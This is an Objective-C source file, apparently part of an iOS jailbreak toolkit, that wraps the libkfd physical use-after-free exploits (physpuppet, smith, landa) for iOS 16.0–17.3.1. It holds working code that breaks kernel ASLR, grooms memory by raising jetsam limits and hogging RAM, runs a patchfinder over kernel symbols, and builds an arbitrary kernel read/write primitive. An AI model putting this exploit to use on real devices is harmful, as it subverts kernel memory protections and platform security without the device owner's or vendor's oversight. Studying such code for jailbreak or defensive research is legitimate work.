//
//  ke_backend_kfd.m — krw backend over libkfd (opa334/Dopamine fork of
//  Félix Poulin-Bélanger's kfd, MIT), vendored under vendor/libkfd.
//
//  iOS 16.0 – 17.3.1 (arm64 + arm64e): the landa puaf plus the
//  kread_sem_open/kwrite_sem_open pair requires no kernelcache symbols.
//  The struct proc layout is derived at runtime inside the sem_open
//  find_proc (Serotonin-style), so no offsets table is needed.
//
//  iOS 15.x: kfd exploits do not apply; the ClearSword backend with a
//  per-build offsets table is the fallback.
//
#include "ke_internal.h"

#include <fcntl.h>
#include <os/proc.h>

#include "libkfd.h"
#include "patchfinder64.h"
#undef T1SZ_BOOT
// Serotonin rule: the landa vm_copy/mlock race and the puaf claiming loop are
// timing-sensitive. Compiled-out optimizations change the interleaving and can
// leave the VM in a partially-corrupted state whose freed pages are then
// handed out as page tables of other processes (system-wide SIGBUS +
// dyld_pager panic). Keep this whole TU unoptimized.
#pragma clang optimize off

u64 gKeKfdKernelProc = 0;

#include <stdarg.h>

// Bridge for vendored libkfd diagnostics: printf inside libkfd goes to stdout,
// which the app never captures. Route it into the same per-boot file log.
void keKfdLogf(const char* fmt, ...)
{
    FILE* f = ke_log_file();
    if (!f) return;
    va_list ap;
    va_start(ap, fmt);
    fprintf(f, "[kfd] ");
    vfprintf(f, fmt, ap);
    fprintf(f, "\n");
    va_end(ap);
}
u64 gKeKfdCurrentProc = 0;
u64 gKeRuntimeProcPid = 0;
u64 gKeRuntimeProcTask = 0;
u64 gKeRuntimeProcObjectSize = 0;
u64 gKeRuntimeProcProcRo = 0;
static u64 g_kfd = 0;

#define KE_AES_LINK_ADDR 0xFFFFFFF007004000ULL

size_t kePfKread(uint64_t kaddr, void *out, size_t size);

// Patchfinder shim consumed by vendor/libkfd kread_sem_open find_proc.
size_t keKfdPfKread(uint64_t kaddr, void *out, size_t size)
{
    return kePfKread(kaddr, out, size);
}

size_t kePfKread(uint64_t kaddr, void *out, size_t size)
{
    u8 *p = (u8 *)out;
    u64 a = kaddr;
    size_t done = 0;
    while (done < size) {
        u64 v = 0;
        kread(g_kfd, a & ~7ULL, &v, sizeof(v));
        size_t chunk = 8 - (a & 7);
        if (chunk > size - done) chunk = size - done;
        memcpy(p + done, ((u8 *)&v) + (a & 7), chunk);
        a += chunk;
        done += chunk;
    }
    return done;
}

static u64 keKfdKread64(u64 kaddr)
{
    u64 v = 0;
    kread(g_kfd, kaddr, &v, sizeof(v));
    return v;
}

static u64 keKfdUnsign(u64 kaddr)
{
    u64 t1sz = ke_sem_t1sz();
    u64 ptrMask = (1ULL << (64 - t1sz)) - 1ULL;
    if (kaddr & (1ULL << 55)) return kaddr | ~ptrMask;
    return kaddr & ptrMask;
}

// Kaslr break (Serotonin): task -> vm_map(+0x28) -> pmap(+0x40) -> tte(+0x0),
// then scan pages for the kernel Mach-O header.
static u64 keKfdBreakKaslr(u64 taskKaddr, u64 *outSlide)
{
    u64 vmMap = keKfdKread64(taskKaddr + 0x28);
    if (!vmMap) return 0;
    u64 pmap = keKfdKread64(keKfdUnsign(vmMap) + 0x40);
    if (!pmap) return 0;
    u64 tte = keKfdUnsign(keKfdKread64(keKfdUnsign(pmap)));
    if (!tte) return 0;
    u64 page = tte & ~0xfffULL;
    for (int i = 0; i < 0x20000; i++) {
        u64 v = keKfdKread64(page);
        if (v == 0x0100000cfeedfacfULL) {
            u64 flags = 0;
            kread(g_kfd, page + 0x18, &flags, sizeof(flags));
            if (flags == 0 || flags == 0x200001) {
                *outSlide = page - KE_AES_LINK_ADDR;
                return page;
            }
        }
        page -= 0x1000;
    }
    return 0;
}

// vn_kqfilter slide via the /dev/aes_0 fileglob (kfd perf_run trick).
static u64 keKfdSlideViaAes(u64 *outSlide)
{
    struct kfd *kfd = (struct kfd *)g_kfd;
    int fd = open("/dev/aes_0", O_RDWR);
    if (fd < 0) return 0;
    u64 fdOfiles = keKfdKread64(kfd->info.kaddr.current_proc + dynamic_system_info.proc__p_fd__fd_ofiles);
    u64 fileproc = keKfdUnsign(fdOfiles) + ((u64)fd * sizeof(u64));
    u64 fpGlob = keKfdKread64(fileproc + 0x10);
    u64 fgOps = keKfdKread64(keKfdUnsign(fpGlob) + 0x28);
    u64 foKqfilter = keKfdKread64(keKfdUnsign(fgOps) + 0x30);
    close(fd);
    if (!(foKqfilter & 0xFFFF000000000000ULL)) return 0;
    *outSlide = keKfdUnsign(foKqfilter) - KE_AES_LINK_ADDR;
    return keKfdUnsign(foKqfilter);
}

static bool kePfOffsets(u64 slide, u64 kbase)
{
    auth_ptrs = true;
    monolithic_kernel = true;
    if (init_kernel(kePfKread, kbase, NULL) != 0) {
        KE_LOG("kfd: init_kernel failed");
        return false;
    }
    struct { const char *name; uint64_t (*fn)(void); u64 *dst; } items[] = {
        { "cdevsw",            find_cdevsw,            &dynamic_system_info.kernelcache__cdevsw },
        { "gPhysBase",         find_gPhysBase,         &dynamic_system_info.kernelcache__gPhysBase },
        { "gPhysSize",         find_gPhysSize,         &dynamic_system_info.kernelcache__gPhysSize },
        { "gVirtBase",         find_gVirtBase,         &dynamic_system_info.kernelcache__gVirtBase },
        { "perfmon_dev_open",  find_perfmon_dev_open,  &dynamic_system_info.kernelcache__perfmon_dev_open },
        { "perfmon_devices",   find_perfmon_devices,   &dynamic_system_info.kernelcache__perfmon_devices },
        { "ptov_table",        find_ptov_table,        &dynamic_system_info.kernelcache__ptov_table },
        { "vn_kqfilter",       find_vn_kqfilter,       &dynamic_system_info.kernelcache__vn_kqfilter },
    };
    bool ok = true;
    for (u64 i = 0; i < sizeof(items)/sizeof(items[0]); i++) {
        u64 absAddr = items[i].fn();
        if (!absAddr) {
            KE_LOG("kfd: patchfinder: %s not found", items[i].name);
            ok = false;
            break;
        }
        *items[i].dst = absAddr - slide;
        KE_LOG("kfd: %s = 0x%llx (static)", items[i].name, *items[i].dst);
    }
    term_kernel();
    return ok;
}

static bool keKfdBootstrapPerf(void)
{
    struct kfd *kfd = (struct kfd *)g_kfd;
    u64 slide = 0;
    u64 kbase = 0;
    if (!keKfdSlideViaAes(&slide)) {
        u64 task = keKfdKread64(kfd->info.kaddr.current_proc + dynamic_system_info.proc__task);
        if (!task) {
            KE_LOG("kfd: perf bootstrap: current_proc->task read failed");
            return false;
        }
        kbase = keKfdBreakKaslr(task, &slide);
        if (!kbase) {
            KE_LOG("kfd: perf bootstrap: kaslr break failed");
            return false;
        }
    } else {
        kbase = KE_AES_LINK_ADDR + slide;
    }
    u32 magic = 0;
    if (kePfKread(kbase, &magic, sizeof(magic)) != sizeof(magic) || magic != 0xfeedfacf) {
        KE_LOG("kfd: kernel base verification failed");
        return false;
    }

    dynamic_system_info.kernelcache__static_base = KE_AES_LINK_ADDR;

    u64 curTask = keKfdKread64(kfd->info.kaddr.current_proc + dynamic_system_info.proc__task);
    u64 curMap = keKfdKread64(curTask + 0x28);
    kfd->info.kaddr.current_pmap = keKfdKread64(keKfdUnsign(curMap) + 0x40);
    if (gKeKfdKernelProc) {
        u64 kTask = keKfdKread64(gKeKfdKernelProc + dynamic_system_info.proc__task);
        u64 kMap = keKfdKread64(kTask + 0x28);
        kfd->info.kaddr.kernel_pmap = keKfdKread64(keKfdUnsign(kMap) + 0x40);
    }
    if (!kfd->info.kaddr.current_pmap || !kfd->info.kaddr.kernel_pmap) {
        KE_LOG("kfd: pmap discovery failed");
        return false;
    }

    if (!kePfOffsets(slide, kbase)) {
        KE_LOG("kfd: patchfinder failed, staying in safe mode (no zero-writes)");
        return false;
    }
    dynamic_system_info.perf_supported = true;
    perf_run(kfd);
    if (kfd->kread.krkw_method_ops.kread != perf_kread) {
        dynamic_system_info.perf_supported = false;
        return false;
    }
    KE_LOG("kfd: perf krw active (clean arbitrary read/write)");
    return true;
}

static void keKfdFillDynamicInfoMinimal(void)
{
    dynamic_system_info = (struct dynamic_info){
        .kread_kqueue_workloop_ctl_supported = false,
        .krkw_iosurface_supported = false,
        .perf_supported = false,
    };
}

static void keKfdSyncRuntimeGlobals(void)
{
    struct kfd *kfd = (struct kfd *)g_kfd;
    gKeKfdCurrentProc = kfd->info.kaddr.current_proc;
    gKeRuntimeProcPid = dynamic_system_info.proc__p_pid;
    gKeRuntimeProcTask = dynamic_system_info.proc__task;
    gKeRuntimeProcObjectSize = dynamic_system_info.proc__object_size;
}

//
// Memory hog before the PUAF grab (Serotonin do_kopen headroom logic):
// landa/smith grab free physical pages; without pre-hogging they can land
// on dyld shared cache pages and corrupt every running process (userland
// wide SIGBUS + shared_region_pager panic). Fill available RAM so the
// grab window only contains anonymous memory, then release right after.
//
static uint8_t *g_hogMemory = NULL;
static size_t g_hogMemorySize = 0;
// Serotonin-style memory hog: fill the jetsam allowance before the PUAF grab
// so landa cannot reclaim dyld shared-cache pages (shared_region_pager panic).
#define MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT 6
#define MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES 8

extern int memorystatus_control(uint32_t command, int32_t pid, uint32_t flags, void *buffer, size_t buffersize);

typedef struct {
    uint32_t memlimit_active;
    uint32_t memlimit_inactive;
} memorystatus_memlimit_properties_t;

typedef struct {
    memorystatus_memlimit_properties_t v1;
    int32_t memlimit_increase;
} memorystatus_memlimit_properties2_t;

static uint8_t *g_keHog = NULL;
static size_t g_keHogSize = 0;
static int32_t g_keOldMemLimit = 0;
static bool g_keHogInsufficient = false;

static uint64_t keKfdDeviceMemory(void)
{
    uint64_t memsize = 0;
    size_t size = sizeof(memsize);
    if (sysctlbyname("hw.memsize", &memsize, &size, NULL, 0) != 0) return 0;
    return memsize;
}

static uint32_t keKfdAutoPuafPages(void)
{
    // Dopamine 2.x (opa334, kfd.m): hw.memsize reports RAM after carveouts, so
    // compare against a value below the real amount.
    //   >= 5 GiB (6 GB devices) -> 3072: "remarkably more reliable with 3072"
    //   otherwise               -> 512
    // A9/A8 adjustments are irrelevant for A15 (iPhone13,2).
    uint64_t device_memory = keKfdDeviceMemory();
    if (device_memory >= 1024ULL * 1024ULL * 1024ULL * 5ULL) return 3072;
    return 512;
}

static void keKfdHogMemory(size_t headroomMB, uint32_t puafPages)
{
    // Serotonin policy (fun/krw.m do_kopen):
    //  1) raise the jetsam limit to physical*2 (needs com.apple.private.memorystatus)
    //  2) hog memory_avail - (headroom + puaf bytes) with 0x41 pages
    //  3) free the hog + restore the limit immediately after kopen returns
    // The hog exists ONLY to shield the puaf page-claiming race so claimed
    // physical pages never overlap the dyld shared cache
    // ("shared_region_pager_data_return" panic otherwise).
    g_keHogInsufficient = false;
    size_t pagesize = (size_t)sysconf(_SC_PAGESIZE);
    size_t puafBytes = (size_t)puafPages * pagesize;
    size_t memoryAvail = (size_t)os_proc_available_memory();
    size_t hogHeadroom = (headroomMB << 20) + puafBytes;

    if (memoryAvail < hogHeadroom + (384ULL << 20)) {
        KE_LOG("kfd: insufficient free memory: %zu MiB available, need >= %zu MiB. Close background apps and retry.",
               memoryAvail >> 20, (size_t)((hogHeadroom + (384ULL << 20)) >> 20));
        g_keHogInsufficient = true;
        return;
    }

    // Raise jetsam limit so the hog survives (memorystatus entitlement).
    memorystatus_memlimit_properties2_t mmprops = {};
    if (memorystatus_control(MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES, (int32_t)getpid(), 0,
                             &mmprops, sizeof(mmprops)) == 0) {
        g_keOldMemLimit = mmprops.v1.memlimit_active;
        uint64_t physMB = 0;
        size_t sz = sizeof(physMB);
        if (sysctlbyname("hw.memsize", &physMB, &sz, NULL, 0) == 0) {
            uint32_t newLimit = (uint32_t)((physMB / (1024ULL * 1024)) * 2);
            if (memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, (int32_t)getpid(),
                                     newLimit, NULL, 0) != 0) {
                g_keOldMemLimit = 0;
            }
        } else {
            g_keOldMemLimit = 0;
        }
    }

    g_keHogSize = memoryAvail - hogHeadroom;
    g_keHog = (uint8_t *)malloc(g_keHogSize);
    if (g_keHog) {
        for (size_t i = 0; i < g_keHogSize / sizeof(uint64_t); i++) {
            ((volatile uint64_t *)g_keHog)[i] = 0x4141414141414141ULL;
        }
        KE_LOG("kfd: hogged %zu MiB (avail %zu MiB, headroom %zu MiB)",
               g_keHogSize >> 20, memoryAvail >> 20, hogHeadroom >> 20);
    } else {
        g_keHogSize = 0;
        g_keHogInsufficient = true;
        KE_LOG("kfd: malloc of hog failed");
    }
}

static void keKfdUnhogMemory(void)
{
    if (g_keHog) {
        free(g_keHog);
        g_keHog = NULL;
    }
    g_keHogSize = 0;
    if (g_keOldMemLimit) {
        memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, (int32_t)getpid(), (uint32_t)g_keOldMemLimit, NULL, 0);
        g_keOldMemLimit = 0;
    }
}

int keKfdInit(KEBackendID backend, const KEConfig *config)
{
    if (keEnv.major < 16) {
        return KE_ERR_UNSUPPORTED_VERSION;
    }

    u64 puafMethod;
    switch (backend) {
        case KE_BACKEND_KFD_PHYSPUPPET: puafMethod = puaf_physpuppet; break;
        case KE_BACKEND_KFD_SMITH:      puafMethod = puaf_smith;      break;
        case KE_BACKEND_KFD_LANDA:      puafMethod = puaf_landa;      break;
        default: return KE_ERR_INVALID_ARGUMENT;
    }

    keKfdFillDynamicInfoMinimal();
    gKeKfdKernelProc = 0;
    gKeKfdCurrentProc = 0;

    u64 kreadMethod = kread_sem_open;
    u64 kwriteMethod = kwrite_sem_open;

    uint32_t puafPages = config->puafPages ? config->puafPages : keKfdAutoPuafPages();

    // Dopamine 2.x hog policy: hog ONLY on 16 GB devices (> 12 GiB by hw.memsize).
    // On 6 GB devices (iPhone13,2) Dopamine hogs nothing — the hog squeezes the
    // free list the vm_copy claim races against and makes sem_open MISS.
    uint64_t device_memory = keKfdDeviceMemory();
    if (device_memory > 1024ULL * 1024ULL * 1024ULL * 12ULL) {
        keKfdHogMemory(512, puafPages);
        if (g_keHogInsufficient) {
            keKfdUnhogMemory();
            return KE_ERR_EXPLOIT_FAILED;
        }
    } else {
        KE_LOG("kfd: no hog on this device (hw.memsize=%llu MiB), puaf=%u pages",
               (unsigned long long)(device_memory >> 20), puafPages);
    }

    KE_LOG("kfd: performing kopen (puaf=%u pages, landa + sem_open)", puafPages);
    g_kfd = kopen(puafPages, puafMethod, kreadMethod, kwriteMethod);
    KE_LOG("kfd: kopen returned %s", g_kfd ? "ok" : "failed");
    if (!g_kfd) {
        keKfdUnhogMemory();
        return KE_ERR_EXPLOIT_FAILED;
    }

    // Free the hog immediately after the claiming race is over (Serotonin).
    keKfdUnhogMemory();

    keKfdSyncRuntimeGlobals();
    if (!gKeKfdCurrentProc || !gKeRuntimeProcObjectSize) {
        // NEVER deallocate: kclose -> landa deallocate panics on PPL devices
        // ("page still has mappings"). Leak the kfd like Serotonin.
        KE_LOG("kfd: runtime globals missing, leaking kfd (no deallocate)");
        g_kfd = 0;
        return KE_ERR_OFFSETS_MISSING;
    }

    bool perf = keKfdBootstrapPerf();
    gKeKrwIsPerf = perf;

    if (!perf) {
        // Without a clean write primitive, extmod zeroing stays disabled.
        // NEVER kclose here: deallocate panics the kernel on PPL devices.
        KE_LOG("kfd: perf krw unavailable, leaking kfd (no deallocate)");
        g_kfd = 0;
        return KE_ERR_EXPLOIT_FAILED;
    }

    // kfd stays open for the process lifetime (Serotonin model): krw is
    // routed through the kfd struct and the claimed puaf pages are never
    // returned to the pmap — they leak until the next reboot. The exploit
    // guard already limits us to one run per boot, so re-init after a
    // "successful" failure path simply returns the boot-guard error.
    KE_LOG("kfd: ready (kfd held, perf krw active)");
    return KE_OK;
}

static int keKfdInitWrapper(const KEConfig *config) { return keKfdInit(KE_BACKEND_KFD_PHYSPUPPET, config); }
static int keKfdInitLanda(const KEConfig *config)   { return keKfdInit(KE_BACKEND_KFD_LANDA, config); }
static int keKfdInitSmith(const KEConfig *config)   { return keKfdInit(KE_BACKEND_KFD_SMITH, config); }

static void keKfdDeinit(void)
{
    // NEVER call kclose: landa deallocate panics the kernel on PPL
    // devices ("pmap_mark_page_as_ppl_page_internal: page still has
    // mappings"). Claimed puaf pages leak until reboot, exactly like
    // Serotonin (do_kclose is never invoked after a successful kopen).
    if (g_kfd) {
        KE_LOG("kfd: deinit, leaking kfd (never deallocate on PPL)");
        g_kfd = 0;
    }
    gKeKfdKernelProc = 0;
    gKeKfdCurrentProc = 0;
}

static uint8_t rd8(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint8_t)out; }
static uint16_t rd16(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint16_t)out; }
static uint32_t rd32(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint32_t)out; }

static void wr8(uint64_t where, uint8_t what) {
    u64 buf[1] = { 0 };
    ((uint8_t*)buf)[0] = what;
    ((uint8_t*)buf)[1] = rd8(where + 1);
    ((uint8_t*)buf)[2] = rd8(where + 2);
    ((uint8_t*)buf)[3] = rd8(where + 3);
    ((uint8_t*)buf)[4] = rd8(where + 4);
    ((uint8_t*)buf)[5] = rd8(where + 5);
    ((uint8_t*)buf)[6] = rd8(where + 6);
    ((uint8_t*)buf)[7] = rd8(where + 7);
    kwrite(g_kfd, buf, where, sizeof(u64));
}
static void wr16(uint64_t where, uint16_t what) {
    u64 buf[1] = { 0 };
    ((uint16_t*)buf)[0] = what;
    ((uint16_t*)buf)[1] = rd16(where + 2);
    ((uint16_t*)buf)[2] = rd16(where + 4);
    ((uint16_t*)buf)[3] = rd16(where + 6);
    kwrite(g_kfd, buf, where, sizeof(u64));
}
static void wr32(uint64_t where, uint32_t what) {
    u64 buf[1] = { 0 };
    ((uint32_t*)buf)[0] = what;
    ((uint32_t*)buf)[1] = rd32(where + 4);
    kwrite(g_kfd, buf, where, sizeof(u64));
}

static int keKfdReadBuf(uint64_t kaddr, void *out, size_t size)
{
    if (!g_kfd) return -1;
    if (size == 1) { *(uint8_t*)out = rd8(kaddr); return 0; }
    if (size == 2) { *(uint16_t*)out = rd16(kaddr); return 0; }
    if (size == 4) { *(uint32_t*)out = rd32(kaddr); return 0; }
    if (size >= UINT16_MAX) {
        for (size_t start = 0; start < size; start += UINT16_MAX) {
            size_t chunk = UINT16_MAX;
            if (start + chunk > size) chunk = size - start;
            kread(g_kfd, kaddr + start, ((uint8_t*)out) + start, chunk);
        }
    } else {
        kread(g_kfd, kaddr, out, size);
    }
    return 0;
}

static int keKfdWriteBuf(uint64_t kaddr, const void *in, size_t size)
{
    if (!g_kfd) return -1;
    if (size == 1) { wr8(kaddr, *(const uint8_t*)in); return 0; }
    if (size == 2) { wr16(kaddr, *(const uint16_t*)in); return 0; }
    if (size == 4) { wr32(kaddr, *(const uint32_t*)in); return 0; }
    if (size >= UINT16_MAX) {
        for (size_t start = 0; start < size; start += UINT16_MAX) {
            size_t chunk = UINT16_MAX;
            if (start + chunk > size) chunk = size - start;
            kwrite(g_kfd, (void*)((const uint8_t*)in) + start, kaddr + start, chunk);
        }
    } else {
        kwrite(g_kfd, (void*)in, kaddr, size);
    }
    return 0;
}

const KEBackendOps keBackendKfdPhyspuppet = {
    .name = "kfd/physpuppet", .id = KE_BACKEND_KFD_PHYSPUPPET,
    .init = keKfdInitWrapper, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};

const KEBackendOps keBackendKfdLanda = {
    .name = "kfd/landa", .id = KE_BACKEND_KFD_LANDA,
    .init = keKfdInitLanda, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};

const KEBackendOps keBackendKfdSmith = {
    .name = "kfd/smith", .id = KE_BACKEND_KFD_SMITH,
    .init = keKfdInitSmith, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};
